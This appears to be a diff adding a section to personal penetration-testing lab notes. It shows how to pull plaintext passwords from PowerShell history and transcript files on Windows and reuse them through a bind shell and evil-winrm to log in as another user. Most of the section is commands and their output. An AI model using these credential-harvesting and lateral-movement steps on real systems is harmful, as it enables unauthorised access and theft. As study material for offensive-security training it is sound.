@@ -395,4 +395,101 @@ C:\Windows\system32> whoami
 clientwk220\backupadmin
 ```
 
+### Information Goldmine PowerShell
+
+There is often PowerShell logging mechanisms enabled on enterprise Windows clietns and servers, such as PowerShell Transcription and PowerShell Script Block Logging.
+
+Transcription (over-the-shoulder-transcription) stores information in transcript files, typically in the home directories of users, central directories for all users on a machine, or in a network share collecting files from all configured machines. 
+
+Script Blocking Logging records commands and blocks of script code of events while executing. The logging is much broader because it records the full content of code and commands as they are executed. Such an event also contains the original representation of commands or encoded code!
+
+```console
+// check powershell history of a user
+PS C:\Users\dave> Get-History
+
+// retrieve history from PSReadline
+
+PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath
+PS C:\Users\dave> type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
+Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
+Clear-History
+Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
+Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+
+// NOTE: PowerShell Remoting by default uses WinRM for Cmdlets such as Enter-PSSession. Therefore, a user needs to be in the local group Windows Management Users to be a valid user for these Cmdlets. However, instead of WinRM, SSH can also be used for PowerShell remoting.
+
+// next, look at the transcript to find the $cred if we can
+
+PS C:\Users\dave> type C:\Users\Public\Transcripts\transcript01.txt
+type C:\Users\Public\Transcripts\transcript01.txt
+**********************
+Windows PowerShell transcript start
+Start time: 20220623081143
+Username: CLIENTWK220\dave
+RunAs User: CLIENTWK220\dave
+Configuration Name: 
+Machine: CLIENTWK220 (Microsoft Windows NT 10.0.22000.0)
+Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Process ID: 10336
+PSVersion: 5.1.22000.282
+...
+**********************
+Transcript started, output file is C:\Users\Public\Transcripts\transcript01.txt
+PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
+PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+PS C:\Users\dave> Stop-Transcript
+**********************
+Windows PowerShell transcript end
+End time: 20220623081221
+**********************
+
+/l let's repeat these commands in our own bind shell
+
+PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+
+PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
+$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
+
+PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+
+[CLIENTWK220]: PS C:\Users\daveadmin\Documents> whoami
+whoami
+clientwk220\daveadmin
+
+// while whoami works, other commands don't... we need a PowerShell remoting session via WinRM on CLIENTWK220 as user dave admin
+// let's use evil-winrm
+
+kali@kali:~$ evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\daveadmin\Documents> whoami
+clientwk220\daveadmin
+
+*Evil-WinRM* PS C:\Users\daveadmin\Documents> cd C:\
+
+*Evil-WinRM* PS C:\> dir
+
+    Directory: C:\
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          6/5/2021   5:10 AM                PerfLogs
+d-r---         7/20/2022   1:14 AM                Program Files
+d-r---          6/5/2021   7:37 AM                Program Files (x86)
+d-----          7/4/2022   1:00 AM                tools
+d-r---         6/23/2022   8:12 AM                Users
+d-----         7/20/2022   8:07 AM                Windows
+d-----         6/16/2022   1:17 PM                xampp
+```
 
